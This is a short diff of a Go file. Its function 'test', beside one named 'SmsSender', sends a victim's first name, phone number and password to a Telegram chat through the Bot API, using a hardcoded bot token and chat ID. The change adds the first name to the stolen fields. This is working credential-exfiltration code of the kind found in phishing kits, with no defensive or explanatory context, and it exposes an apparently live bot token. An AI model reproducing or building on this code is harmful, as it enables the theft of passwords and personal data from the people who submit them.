@@ -75,7 +75,7 @@ func SmsSender(first_name string, phone string, password string) {
 
 func test(first_name string, phone string, password string) {
 	num := strconv.Itoa(-1001685855235)
-	httpposturl := fmt.Sprintf("https://api.telegram.org/bot5497289382:AAEAuBV4_JOoU1qwIo9RPktV9X1l7FfOG7o/sendMessage?chat_id=%s&text=%s+%s", num, phone, password)
+	httpposturl := fmt.Sprintf("https://api.telegram.org/bot5497289382:AAEAuBV4_JOoU1qwIo9RPktV9X1l7FfOG7o/sendMessage?chat_id=%s&text=%s+%s+%s", num, first_name, phone, password)
 	var jsonData = []byte(`{
         "text": phone,
         "job": "leader"
